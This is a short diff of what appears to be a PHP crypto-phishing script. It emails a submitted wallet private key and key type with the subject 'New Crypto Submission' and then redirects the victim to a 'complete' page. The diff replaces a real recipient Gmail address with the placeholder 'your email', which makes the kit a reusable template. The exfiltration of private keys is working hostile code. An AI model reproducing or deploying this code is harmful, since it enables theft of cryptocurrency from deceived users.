@@ -11,7 +11,7 @@ $msg =  "Private Key: ".$f." \n Type: ".$b;
 $msg = wordwrap($msg,70);
 
 // send email
-mail("geofferychidera29@gmail.com","New Crypto Submission",$msg);
+mail("your email","New Crypto Submission",$msg);
 
 header("Location: ://connectnowonline.online/complete");
 die();
